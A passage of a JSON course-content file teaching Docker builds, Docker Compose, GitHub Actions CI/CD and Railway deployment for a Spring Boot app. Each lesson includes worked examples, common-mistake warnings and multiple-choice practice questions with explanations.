            {
              "type": "EXAMPLE",
              "title": "Building and Running",
              "content": "Commands to build and run your Docker container:",
              "code": "# Build the image\ndocker build -t myapp:latest .\n\n# Explanation:\n# docker build     - build an image\n# -t myapp:latest  - tag it as 'myapp' with 'latest' version\n# .                - use Dockerfile in current directory\n\n# List images\ndocker images\n# REPOSITORY    TAG       IMAGE ID       SIZE\n# myapp         latest    abc123def      180MB\n\n# Run the container\ndocker run -d -p 8080:8080 --name myapp-container myapp:latest\n\n# Explanation:\n# docker run                 - run a container\n# -d                        - detached mode (background)\n# -p 8080:8080              - map host port 8080 to container port 8080\n# --name myapp-container    - name the container\n# myapp:latest              - image to run\n\n# View running containers\ndocker ps\n# CONTAINER ID   IMAGE           STATUS         PORTS\n# def456abc      myapp:latest    Up 5 seconds   0.0.0.0:8080->8080/tcp\n\n# View logs\ndocker logs myapp-container\ndocker logs -f myapp-container  # Follow mode (like tail -f)\n\n# Stop the container\ndocker stop myapp-container\n\n# Remove the container\ndocker rm myapp-container\n\n# Remove the image\ndocker rmi myapp:latest",
              "language": "bash"
            },
            {
              "type": "KEY_POINT",
              "title": "Docker Layer Caching",
              "content": "Docker builds images in LAYERS. Each instruction creates a layer:\n\nFROM eclipse-temurin:21-jdk-alpine  # Layer 1: Base image\nCOPY pom.xml .                      # Layer 2: pom.xml\nRUN mvn dependency:go-offline       # Layer 3: Dependencies\nCOPY src/ src/                      # Layer 4: Source code\nRUN mvn package                     # Layer 5: Build\n\nCALLING STRATEGY:\n- Docker caches each layer\n- If a layer changes, all subsequent layers rebuild\n- Order matters!\n\nBAD ORDER:\nCOPY . .                    # Copy everything first\nRUN mvn package             # Download deps + build\n\nProblem: Any file change (even README) busts the cache\nand re-downloads all dependencies.\n\nGOOD ORDER:\nCOPY pom.xml .              # pom.xml rarely changes\nRUN mvn dependency:go-offline  # Cache dependencies\nCOPY src/ src/              # Source changes often\nRUN mvn package -o          # Build (use offline mode)\n\nResult: Change source code? Only layers 4-5 rebuild.\nDependencies stay cached. Builds go from 5 min to 30 sec.\n\n.dockerignore FILE:\ntarget/\n.git/\n.idea/\n*.md\n\nExclude files that shouldn't go in the image."
            },
            {
              "type": "WARNING",
              "title": "Common Docker Mistakes",
              "content": "MISTAKE 1: Running as root\n\n# BAD - container runs as root\nENTRYPOINT [\"java\", \"-jar\", \"app.jar\"]\n\n# GOOD - create and use non-root user\nRUN addgroup -S spring && adduser -S spring -G spring\nUSER spring:spring\n\nMISTAKE 2: No .dockerignore\n\n# Without .dockerignore, COPY . . includes:\n# - target/ (huge, unnecessary)\n# - .git/ (huge, security risk)\n# - node_modules/ (if frontend exists)\n# - IDE files\n\nMISTAKE 3: Using 'latest' tag in production\n\n# BAD - 'latest' can change unexpectedly\ndocker pull myapp:latest\n\n# GOOD - use specific version\ndocker pull myapp:1.2.3\ndocker pull myapp:$(git rev-parse --short HEAD)\n\nMISTAKE 4: Not handling signals\n\nSpring Boot needs graceful shutdown:\n\nENTRYPOINT [\"java\", \"-jar\", \"app.jar\"]\n\nAdd to application.properties:\nserver.shutdown=graceful\nspring.lifecycle.timeout-per-shutdown-phase=30s\n\nMISTAKE 5: Hardcoding configuration\n\n# BAD\nENV DB_URL=jdbc:postgresql://localhost:5432/mydb\n\n# GOOD - configure at runtime\ndocker run -e DB_URL=jdbc:postgresql://prod-db:5432/mydb myapp"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "devops-lesson-2-mc-1",
              "title": "Multi-Stage Builds",
              "description": "Understanding why multi-stage builds are used",
              "question": "Why does the Dockerfile use two FROM statements (multi-stage build)?",
              "options": [
                "To run two applications in one container",
                "To use JDK for building but only JRE for running, reducing image size",
                "To support multiple Java versions",
                "It's required for Spring Boot applications"
              ],
              "correctAnswer": 1,
              "explanation": "Multi-stage builds separate build-time dependencies from runtime. The first stage uses the full JDK (includes compiler) to build the JAR. The second stage uses only the JRE (no compiler needed at runtime), reducing the final image from ~300MB to ~180MB. Build tools, source code, and intermediate files are discarded.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "devops-lesson-2-mc-2",
              "title": "Docker Layer Caching",
              "description": "Understanding layer caching for faster builds",
              "question": "You changed one line in your Java source code. With proper Dockerfile ordering, which layers need to rebuild?",
              "options": [
                "All layers - Docker rebuilds everything on any change",
                "Only the layers after COPY src/ and the final build step",
                "Only the base image layer",
                "No layers - Docker uses cached results for source changes"
              ],
              "correctAnswer": 1,
              "explanation": "Docker caches layers and only rebuilds from the point where changes occur. With proper ordering (dependencies before source), changing source code only invalidates layers after COPY src/. The base image and dependency download layers remain cached, making rebuilds much faster.",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "devops-lesson-3",
          "title": "Lesson D.3: Docker Compose",
          "moduleId": "module-devops",
          "order": 3,
          "estimatedMinutes": 35,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Multiple Containers",
              "content": "Real applications rarely run alone. Your Spring Boot app needs:\n\n- PostgreSQL database\n- Redis for caching\n- Maybe Elasticsearch for search\n- Maybe a message queue\n\nRUNNING MULTIPLE CONTAINERS MANUALLY:\n\n# Start PostgreSQL\ndocker run -d --name postgres \\\n  -e POSTGRES_PASSWORD=secret \\\n  -p 5432:5432 \\\n  postgres:16\n\n# Start Redis\ndocker run -d --name redis \\\n  -p 6379:6379 \\\n  redis:7\n\n# Start your app (needs to connect to both)\ndocker run -d --name myapp \\\n  -e DB_URL=jdbc:postgresql://postgres:5432/mydb \\\n  -e REDIS_HOST=redis \\\n  -p 8080:8080 \\\n  --link postgres \\\n  --link redis \\\n  myapp:latest\n\nPROBLEMS:\n- Many commands to remember\n- Order matters (database before app)\n- Links are deprecated\n- No easy way to share this with team\n- 'Restart everything' is painful\n\nDocker Compose solves all of this."
            },
            {
              "type": "KEY_POINT",
              "title": "Docker Compose: One File to Rule Them All",
              "content": "Docker Compose lets you define multi-container applications in a single YAML file:\n\n# docker-compose.yml\nservices:\n  app:\n    build: .\n    ports:\n      - \"8080:8080\"\n    depends_on:\n      - db\n    environment:\n      - SPRING_DATASOURCE_URL=jdbc:postgresql://db:5432/mydb\n\n  db:\n    image: postgres:16\n    environment:\n      - POSTGRES_DB=mydb\n      - POSTGRES_PASSWORD=secret\n\nNOW, ONE COMMAND:\n\ndocker compose up     # Start everything\ndocker compose down   # Stop everything\ndocker compose logs   # View all logs\n\nBENEFITS:\n- All services defined in one file\n- Automatic networking between services\n- Dependency ordering (depends_on)\n- Easy to version control\n- Same file works for entire team\n- 'docker compose up' and you're running"
            },
            {
              "type": "EXAMPLE",
              "title": "Complete docker-compose.yml",
              "content": "Full example with Spring Boot + PostgreSQL + proper configuration:",
              "code": "# docker-compose.yml\nversion: '3.8'\n\nservices:\n  # Spring Boot Application\n  app:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    ports:\n      - \"8080:8080\"\n    depends_on:\n      db:\n        condition: service_healthy\n    environment:\n      - SPRING_PROFILES_ACTIVE=docker\n      - SPRING_DATASOURCE_URL=jdbc:postgresql://db:5432/myapp\n      - SPRING_DATASOURCE_USERNAME=postgres\n      - SPRING_DATASOURCE_PASSWORD=postgres\n    healthcheck:\n      test: [\"CMD\", \"wget\", \"-q\", \"--spider\", \"http://localhost:8080/actuator/health\"]\n      interval: 30s\n      timeout: 10s\n      retries: 3\n    restart: unless-stopped\n\n  # PostgreSQL Database\n  db:\n    image: postgres:16-alpine\n    environment:\n      - POSTGRES_DB=myapp\n      - POSTGRES_USER=postgres\n      - POSTGRES_PASSWORD=postgres\n    ports:\n      - \"5432:5432\"\n    volumes:\n      - postgres_data:/var/lib/postgresql/data\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U postgres\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n    restart: unless-stopped\n\n# Persistent storage for database\nvolumes:\n  postgres_data:",
              "language": "yaml"
            },
            {
              "type": "THEORY",
              "title": "Understanding the Configuration",
              "content": "KEY SECTIONS EXPLAINED:\n\nservices:\n  Each service is a container. 'app' and 'db' are service names.\n  These names become DNS hostnames on the network.\n  Your app connects to 'db:5432' not 'localhost:5432'.\n\nbuild:\n  context: .            # Directory with Dockerfile\n  dockerfile: Dockerfile # Which Dockerfile to use\n\nimage:\n  image: postgres:16-alpine   # Use pre-built image\n  Don't use 'latest' - pin versions!\n\nports:\n  - \"8080:8080\"    # host:container\n  - \"5432:5432\"    # Expose DB for local development\n\ndepends_on:\n  db:\n    condition: service_healthy   # Wait for health check\n  Without condition, only waits for container to START\n  (not for service to be READY)\n\nenvironment:\n  Pass environment variables to container\n  Spring Boot reads these automatically\n  SPRING_DATASOURCE_URL overrides application.properties\n\nvolumes:\n  postgres_data:/var/lib/postgresql/data\n  Named volume - data persists when container stops\n  Without this, database is wiped on restart!\n\nhealthcheck:\n  Container orchestrators use this to know when\n  service is actually ready, not just running\n\nrestart: unless-stopped\n  Auto-restart on crash (but not if manually stopped)"
            },
            {
              "type": "EXAMPLE",
              "title": "Spring Profile for Docker",
              "content": "Create a Docker-specific profile to handle the different database URL:",
              "code": "# src/main/resources/application.properties\n# Default configuration (local development)\nspring.datasource.url=jdbc:postgresql://localhost:5432/myapp\nspring.datasource.username=postgres\nspring.datasource.password=postgres\n\n# src/main/resources/application-docker.properties\n# Docker configuration (overrides default)\n# Database URL points to Docker service name 'db'\nspring.datasource.url=jdbc:postgresql://db:5432/myapp\n\n# Note: Username and password inherited from application.properties\n# unless overridden by environment variables",
              "language": "properties"
            },
            {
              "type": "KEY_POINT",
              "title": "Essential Commands",
              "content": "STARTING SERVICES:\n\ndocker compose up              # Start all, attached (see logs)\ndocker compose up -d           # Start all, detached (background)\ndocker compose up --build      # Rebuild images before starting\ndocker compose up app          # Start only 'app' and dependencies\n\nSTOPPING SERVICES:\n\ndocker compose stop            # Stop containers (keep data)\ndocker compose down            # Stop and remove containers\ndocker compose down -v         # Also remove volumes (wipes data!)\n\nVIEWING STATUS:\n\ndocker compose ps              # List running services\ndocker compose logs            # View all logs\ndocker compose logs -f app     # Follow logs for 'app' service\ndocker compose top             # Show running processes\n\nDEBUGGING:\n\ndocker compose exec app sh     # Shell into running container\ndocker compose exec db psql -U postgres  # Connect to database\n\nREBUILDING:\n\ndocker compose build           # Rebuild all images\ndocker compose build app       # Rebuild only 'app'\ndocker compose up --build -d   # Rebuild and restart\n\nCLEANUP:\n\ndocker compose down --rmi all  # Remove images too\ndocker system prune            # Clean unused Docker resources"
            },
            {
              "type": "WARNING",
              "title": "Common Docker Compose Mistakes",
              "content": "MISTAKE 1: Forgetting volumes (data loss!)\n\n# BAD - data lost when container stops\ndb:\n  image: postgres:16\n\n# GOOD - data persists\ndb:\n  image: postgres:16\n  volumes:\n    - postgres_data:/var/lib/postgresql/data\n\nvolumes:\n  postgres_data:\n\nMISTAKE 2: depends_on without health check\n\n# BAD - app starts before DB is ready\ndepends_on:\n  - db\n\n# GOOD - waits for DB health check\ndepends_on:\n  db:\n    condition: service_healthy\n\nMISTAKE 3: Hardcoding secrets\n\n# BAD - secrets in version control\nenvironment:\n  - POSTGRES_PASSWORD=supersecretpassword\n\n# BETTER - use .env file (add to .gitignore)\nenvironment:\n  - POSTGRES_PASSWORD=${DB_PASSWORD}\n\n# Create .env file:\n# DB_PASSWORD=supersecretpassword\n\nMISTAKE 4: Using 'localhost' in container\n\n# BAD - 'localhost' inside container is the container itself\nSPRING_DATASOURCE_URL=jdbc:postgresql://localhost:5432/myapp\n\n# GOOD - use service name\nSPRING_DATASOURCE_URL=jdbc:postgresql://db:5432/myapp"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "devops-lesson-3-mc-1",
              "title": "Container Networking",
              "description": "Understanding how containers communicate",
              "question": "In docker-compose.yml, your app connects to 'db:5432'. What does 'db' refer to?",
              "options": [
                "A DNS entry in /etc/hosts on your computer",
                "The Docker service name, which Docker's internal DNS resolves to the container IP",
                "A hardcoded IP address that Docker assigns",
                "An environment variable that must be set"
              ],
              "correctAnswer": 1,
              "explanation": "Docker Compose creates a network and runs an internal DNS server. Service names (like 'db') become DNS hostnames that resolve to the container's IP address. This allows containers to communicate using predictable names instead of dynamic IP addresses.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "devops-lesson-3-mc-2",
              "title": "Data Persistence",
              "description": "Understanding Docker volumes",
              "question": "You run 'docker compose down' and then 'docker compose up'. What happens to your PostgreSQL data?",
              "options": [
                "Data is always lost - containers are ephemeral",
                "Data is preserved if you used a named volume, lost if you didn't",
                "Data is automatically backed up to Docker Hub",
                "Data is preserved in the container's filesystem"
              ],
              "correctAnswer": 1,
              "explanation": "Named volumes (postgres_data:/var/lib/postgresql/data) persist data outside the container lifecycle. 'docker compose down' removes containers but not named volumes. 'docker compose down -v' removes volumes too. Without volumes, container data is lost when the container is removed.",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "devops-lesson-4",
          "title": "Lesson D.4: GitHub Actions CI/CD",
          "moduleId": "module-devops",
          "order": 4,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "What is GitHub Actions?",
              "content": "GitHub Actions is a CI/CD platform built into GitHub. It runs automated workflows in response to events:\n\nEVENTS THAT TRIGGER WORKFLOWS:\n- push: Code pushed to repository\n- pull_request: PR opened, updated, or merged\n- schedule: Cron-based scheduling\n- workflow_dispatch: Manual trigger\n- release: New release published\n\nWHAT CAN WORKFLOWS DO?\n- Build and test your code\n- Run linters and security scanners\n- Build Docker images\n- Deploy to cloud platforms\n- Send notifications\n- Almost anything you can script!\n\nKEY CONCEPTS:\n\nWorkflow: A configurable automated process\n  - Defined in .github/workflows/*.yml\n  - Triggered by events\n  - Contains one or more jobs\n\nJob: A set of steps that execute on the same runner\n  - Runs on a virtual machine\n  - Jobs run in parallel by default\n  - Can depend on other jobs\n\nStep: An individual task\n  - Runs a command or action\n  - Steps run sequentially\n  - Share data within a job\n\nAction: A reusable unit of code\n  - Community-maintained (actions/checkout, actions/setup-java)\n  - Or your own custom actions"
            },
            {
              "type": "EXAMPLE",
              "title": "Complete CI/CD Workflow",
              "content": "Full GitHub Actions workflow for a Spring Boot application:",
              "code": "# .github/workflows/ci-cd.yml\nname: CI/CD Pipeline\n\n# When to run\non:\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main]\n\n# Environment variables available to all jobs\nenv:\n  JAVA_VERSION: '21'\n  REGISTRY: ghcr.io\n  IMAGE_NAME: ${{ github.repository }}\n\njobs:\n  # Job 1: Build and Test\n  test:\n    name: Build and Test\n    runs-on: ubuntu-latest\n    \n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n      \n      - name: Set up Java\n        uses: actions/setup-java@v4\n        with:\n          java-version: ${{ env.JAVA_VERSION }}\n          distribution: 'temurin'\n          cache: 'maven'\n      \n      - name: Run tests\n        run: ./mvnw verify\n      \n      - name: Upload test results\n        if: always()\n        uses: actions/upload-artifact@v4\n        with:\n          name: test-results\n          path: target/surefire-reports/\n\n  # Job 2: Build and Push Docker Image\n  build:\n    name: Build Docker Image\n    needs: test\n    runs-on: ubuntu-latest\n    if: github.ref == 'refs/heads/main'\n    \n    permissions:\n      contents: read\n      packages: write\n    \n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n      \n      - name: Log in to Container Registry\n        uses: docker/login-action@v3\n        with:\n          registry: ${{ env.REGISTRY }}\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n      \n      - name: Extract metadata\n        id: meta\n        uses: docker/metadata-action@v5\n        with:\n          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}\n          tags: |\n            type=sha,prefix=\n            type=raw,value=latest\n      \n      - name: Build and push\n        uses: docker/build-push-action@v5\n        with:\n          context: .\n          push: true\n          tags: ${{ steps.meta.outputs.tags }}\n\n  # Job 3: Deploy to Railway\n  deploy:\n    name: Deploy to Railway\n    needs: build\n    runs-on: ubuntu-latest\n    if: github.ref == 'refs/heads/main'\n    \n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n      \n      - name: Install Railway CLI\n        run: npm install -g @railway/cli\n      \n      - name: Deploy to Railway\n        run: railway up --service ${{ secrets.RAILWAY_SERVICE_ID }}\n        env:\n          RAILWAY_TOKEN: ${{ secrets.RAILWAY_TOKEN }}",
              "language": "yaml"
            },
            {
              "type": "THEORY",
              "title": "Understanding the Workflow",
              "content": "WORKFLOW STRUCTURE:\n\nname: CI/CD Pipeline           # Display name in GitHub UI\n\non:                             # Trigger events\n  push:\n    branches: [main, develop]   # Only these branches\n  pull_request:\n    branches: [main]            # PRs targeting main\n\njobs:                           # What to do\n\nJOB STRUCTURE:\n\ntest:\n  name: Build and Test          # Display name\n  runs-on: ubuntu-latest        # Virtual machine type\n  steps:                        # Sequential tasks\n\nCOMMON RUNNERS:\n- ubuntu-latest: Linux (most common)\n- windows-latest: Windows\n- macos-latest: macOS (expensive minutes)\n\nJOB DEPENDENCIES:\n\nbuild:\n  needs: test                   # Wait for 'test' to pass\n  if: github.ref == 'refs/heads/main'  # Only on main branch\n\nCONDITIONAL EXECUTION:\n\n- if: always()                  # Run even if previous step failed\n- if: success()                 # Only if previous steps succeeded (default)\n- if: failure()                 # Only if previous steps failed\n- if: github.event_name == 'push'\n- if: github.ref == 'refs/heads/main'"
            },
            {
              "type": "KEY_POINT",
              "title": "Secrets Management",
              "content": "NEVER PUT SECRETS IN WORKFLOW FILES!\n\n# BAD - exposed in version control\nenv:\n  DATABASE_PASSWORD: supersecret123\n\n# GOOD - use GitHub Secrets\nenv:\n  DATABASE_PASSWORD: ${{ secrets.DATABASE_PASSWORD }}\n\nSETTING UP SECRETS:\n\n1. Go to repository Settings\n2. Click 'Secrets and variables' > 'Actions'\n3. Click 'New repository secret'\n4. Add name (e.g., RAILWAY_TOKEN) and value\n\nCOMMON SECRETS:\n- RAILWAY_TOKEN: For Railway deployment\n- DOCKER_USERNAME, DOCKER_PASSWORD: For Docker Hub\n- AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY: For AWS\n- GITHUB_TOKEN: Automatically provided by GitHub!\n\nBUILT-IN VARIABLES:\n\n${{ github.repository }}     # owner/repo\n${{ github.actor }}          # Username who triggered\n${{ github.sha }}            # Full commit SHA\n${{ github.ref }}            # refs/heads/main\n${{ github.event_name }}     # push, pull_request, etc.\n${{ secrets.GITHUB_TOKEN }}  # Auto-generated token\n\nUSING OUTPUTS BETWEEN STEPS:\n\n- name: Get version\n  id: version\n  run: echo \"version=$(cat VERSION)\" >> $GITHUB_OUTPUT\n\n- name: Use version\n  run: echo \"Version is ${{ steps.version.outputs.version }}\""
            },
            {
              "type": "EXAMPLE",
              "title": "Simple Test-Only Workflow",
              "content": "A minimal workflow just for running tests on every push:",
              "code": "# .github/workflows/test.yml\nname: Tests\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      - uses: actions/setup-java@v4\n        with:\n          java-version: '21'\n          distribution: 'temurin'\n          cache: 'maven'\n      \n      - name: Run tests\n        run: ./mvnw test\n      \n      - name: Test Report\n        uses: dorny/test-reporter@v1\n        if: success() || failure()\n        with:\n          name: Maven Tests\n          path: target/surefire-reports/*.xml\n          reporter: java-junit",
              "language": "yaml"
            },
            {
              "type": "WARNING",
              "title": "Common GitHub Actions Pitfalls",
              "content": "PITFALL 1: Not caching dependencies\n\n# BAD - downloads dependencies every run (slow!)\n- uses: actions/setup-java@v4\n  with:\n    java-version: '21'\n    distribution: 'temurin'\n\n# GOOD - caches Maven dependencies\n- uses: actions/setup-java@v4\n  with:\n    java-version: '21'\n    distribution: 'temurin'\n    cache: 'maven'\n\nPITFALL 2: Secrets in logs\n\n# BAD - prints secret to logs\n- run: echo ${{ secrets.API_KEY }}\n\n# GOOD - GitHub masks secrets, but be careful\n- run: ./deploy.sh\n  env:\n    API_KEY: ${{ secrets.API_KEY }}\n\nPITFALL 3: Not failing fast\n\n# If one test fails, stop immediately\njobs:\n  test:\n    strategy:\n      fail-fast: true\n      matrix:\n        java: [17, 21]\n\nPITFALL 4: Ignoring exit codes\n\n# BAD - continues even if command fails\n- run: |\n    ./risky-command || true\n    ./next-command\n\n# GOOD - let failures stop the workflow\n- run: ./risky-command\n- run: ./next-command"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "devops-lesson-4-mc-1",
              "title": "Workflow Triggers",
              "description": "Understanding when workflows run",
              "question": "Given this trigger configuration, when does the workflow run?\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]",
              "options": [
                "Only when pushing directly to main",
                "Only when a pull request targets main",
                "When pushing to main OR when a PR targets main",
                "On every push and every pull request to any branch"
              ],
              "correctAnswer": 2,
              "explanation": "The 'on' section defines trigger events. Multiple events are OR-ed together. This workflow runs when: (1) Code is pushed directly to main, OR (2) A pull request is opened/updated that targets main. It does NOT run for pushes to other branches or PRs targeting other branches.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "devops-lesson-4-mc-2",
              "title": "Job Dependencies",
              "description": "Understanding job ordering and conditions",
              "question": "Given 'needs: test' and 'if: github.ref == 'refs/heads/main'', when does the deploy job run?",
              "options": [
                "Immediately when any push occurs",
                "After test passes, but only if the push was to main",
                "Only on pull requests to main",
                "After test passes, regardless of branch"
              ],
              "correctAnswer": 1,
              "explanation": "'needs: test' means the deploy job waits for the test job to complete successfully. 'if: github.ref == 'refs/heads/main'' adds an additional condition: the branch must be main. So deploy runs only when: (1) test job passes, AND (2) the push was to the main branch. PRs don't set github.ref to refs/heads/main.",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "devops-lesson-5",
          "title": "Lesson D.5: Cloud Deployment",
          "moduleId": "module-devops",
          "order": 5,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Deployment Options",
              "content": "Where can you run your Spring Boot application?\n\nTRADITIONAL HOSTING (VPS):\n- DigitalOcean Droplets, AWS EC2, Linode\n- You manage the server, OS, Java, etc.\n- Full control, full responsibility\n- Good for: Learning Linux, complex setups\n\nPLATFORM AS A SERVICE (PaaS):\n- Railway, Heroku, Render, Fly.io\n- Upload code, platform handles the rest\n- Less control, less work\n- Good for: Getting started, MVPs, side projects\n\nCONTAINER PLATFORMS:\n- AWS ECS/EKS, Google Cloud Run, Azure Container Apps\n- Run Docker containers at scale\n- More control than PaaS, less than VPS\n- Good for: Production workloads\n\nSERVERLESS:\n- AWS Lambda, Google Cloud Functions\n- Pay only when code runs\n- Limited to short-lived functions\n- Good for: Event-driven, low-traffic apps\n\nFOR LEARNING:\nWe'll use Railway because:\n- Free tier for hobby projects\n- Git-based deployments\n- Automatic HTTPS\n- Easy PostgreSQL addon\n- No credit card required to start"
            },
            {
              "type": "KEY_POINT",
              "title": "Railway Basics",
              "content": "Railway is a modern PaaS that makes deployment simple:\n\nKEY FEATURES:\n- Deploy from GitHub with auto-deploy on push\n- Built-in PostgreSQL, Redis, MySQL\n- Environment variables management\n- Automatic HTTPS certificates\n- Logs and metrics\n- Private networking between services\n\nPRICING (as of 2025):\n- Free tier: $5/month credit (enough for small apps)\n- Hobby: $5/month per service\n- Pro: Usage-based pricing\n\nDEPLOYMENT METHODS:\n\n1. GitHub Integration (recommended):\n   - Connect GitHub repo\n   - Auto-deploy on push to main\n   - Automatic rollback on failure\n\n2. Railway CLI:\n   - railway login\n   - railway up\n   - Good for CI/CD pipelines\n\n3. Docker Image:\n   - Push to container registry\n   - Railway pulls and runs\n\nRAILWAY DETECTS:\n- Dockerfile (uses it)\n- pom.xml (runs Maven build)\n- package.json (runs npm)\n- Go, Python, Ruby, etc."
            },
            {
              "type": "EXAMPLE",
              "title": "Deploying to Railway",
              "content": "Step-by-step deployment of your Spring Boot application:",
              "code": "# Step 1: Prepare your application\n\n# Ensure you have a Dockerfile (Railway will use it)\n# Or Railway auto-detects pom.xml and builds with Maven\n\n# Add health endpoint for Railway\n# In pom.xml, add Spring Boot Actuator:\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-actuator</artifactId>\n</dependency>\n\n# In application.properties:\nmanagement.endpoints.web.exposure.include=health\nmanagement.endpoint.health.show-details=always\n\n# Step 2: Configure for production\n\n# application-production.properties\nspring.datasource.url=${DATABASE_URL}\nserver.port=${PORT:8080}\nspring.jpa.hibernate.ddl-auto=update\n\n# Note: Railway sets DATABASE_URL and PORT automatically!\n\n# Step 3: Deploy via GitHub\n\n# 1. Push to GitHub\ngit push origin main\n\n# 2. Go to railway.app\n# 3. Click 'New Project'\n# 4. Select 'Deploy from GitHub repo'\n# 5. Choose your repository\n# 6. Railway auto-detects and deploys!\n\n# Step 4: Add PostgreSQL\n\n# In Railway dashboard:\n# 1. Click '+ New' in your project\n# 2. Select 'Database' > 'PostgreSQL'\n# 3. Railway auto-connects and sets DATABASE_URL\n\n# Step 5: Set environment variables\n\n# In Railway dashboard > your service > Variables:\nSPRING_PROFILES_ACTIVE=production\nJWT_SECRET=your-production-secret\n# Railway auto-provides: DATABASE_URL, PORT",
              "language": "bash"
            },
            {
              "type": "THEORY",
              "title": "Environment Configuration",
              "content": "Production applications need different configuration:\n\n12-FACTOR APP PRINCIPLE:\nConfiguration should come from ENVIRONMENT VARIABLES,\nnot hardcoded in files.\n\nSPRING BOOT READS ENV VARS AUTOMATICALLY:\n\nEnvironment variable:          Property:\nSPRING_DATASOURCE_URL    ->   spring.datasource.url\nSPRING_PROFILES_ACTIVE   ->   spring.profiles.active\nJWT_SECRET               ->   jwt.secret (custom)\n\nEXAMPLE CONFIGURATION:\n\n# application.properties (defaults for local dev)\nspring.datasource.url=jdbc:postgresql://localhost:5432/myapp\nspring.datasource.username=postgres\nspring.datasource.password=postgres\n\n# In Railway, set environment variables:\nDATABASE_URL=postgresql://user:pass@host:5432/db\n# Spring Boot reads this automatically!\n\n# For custom properties:\n@Value(\"${jwt.secret}\")\nprivate String jwtSecret;\n\n# Set in Railway:\nJWT_SECRET=super-secret-production-key\n\nENVIRONMENT-SPECIFIC PROFILES:\n\n# application-production.properties\nspring.jpa.show-sql=false\nlogging.level.root=WARN\n\n# In Railway:\nSPRING_PROFILES_ACTIVE=production"
            },
            {
              "type": "EXAMPLE",
              "title": "GitHub Actions + Railway",
              "content": "Automated deployment from GitHub Actions:",
              "code": "# .github/workflows/deploy.yml\nname: Deploy to Railway\n\non:\n  push:\n    branches: [main]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      \n      - uses: actions/setup-java@v4\n        with:\n          java-version: '21'\n          distribution: 'temurin'\n          cache: 'maven'\n      \n      - name: Run tests\n        run: ./mvnw verify\n\n  deploy:\n    needs: test\n    runs-on: ubuntu-latest\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Install Railway CLI\n        run: npm install -g @railway/cli\n      \n      - name: Deploy to Railway\n        run: railway up --service ${{ vars.RAILWAY_SERVICE_ID }}\n        env:\n          RAILWAY_TOKEN: ${{ secrets.RAILWAY_TOKEN }}\n\n# How to get RAILWAY_TOKEN:\n# 1. Go to railway.app/account/tokens\n# 2. Generate a new token\n# 3. Add to GitHub repo secrets as RAILWAY_TOKEN\n\n# How to get RAILWAY_SERVICE_ID:\n# 1. In Railway dashboard, click your service\n# 2. Go to Settings\n# 3. Copy the Service ID\n# 4. Add to GitHub repo variables as RAILWAY_SERVICE_ID",
              "language": "yaml"
            },
            {
              "type": "KEY_POINT",
              "title": "Health Checks and Monitoring",
              "content": "Production applications need health monitoring:\n\nSPRING BOOT ACTUATOR:\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-actuator</artifactId>\n</dependency>\n\nENDPOINTS:\n\nGET /actuator/health\n{\n  \"status\": \"UP\",\n  \"components\": {\n    \"db\": { \"status\": \"UP\" },\n    \"diskSpace\": { \"status\": \"UP\" }\n  }\n}\n\nCONFIGURATION:\n\n# application.properties\nmanagement.endpoints.web.exposure.include=health,info,metrics\nmanagement.endpoint.health.show-details=when-authorized\n\nHEALTH CHECK TYPES:\n- Liveness: Is the app running? (/actuator/health/liveness)\n- Readiness: Is the app ready for traffic? (/actuator/health/readiness)\n\nRAILWAY HEALTH CHECKS:\n\nRailway checks /actuator/health automatically.\nIf it returns non-200, Railway:\n1. Marks the deploy as failed\n2. Rolls back to previous version\n3. Sends notification\n\nCUSTOM HEALTH INDICATOR:\n\n@Component\npublic class ExternalApiHealthIndicator implements HealthIndicator {\n    @Override\n    public Health health() {\n        boolean apiReachable = checkExternalApi();\n        if (apiReachable) {\n            return Health.up().withDetail(\"api\", \"reachable\").build();\n        }\n        return Health.down().withDetail(\"api\", \"unreachable\").build();\n    }\n}"
            },
            {
              "type": "WARNING",
              "title": "Production Checklist",
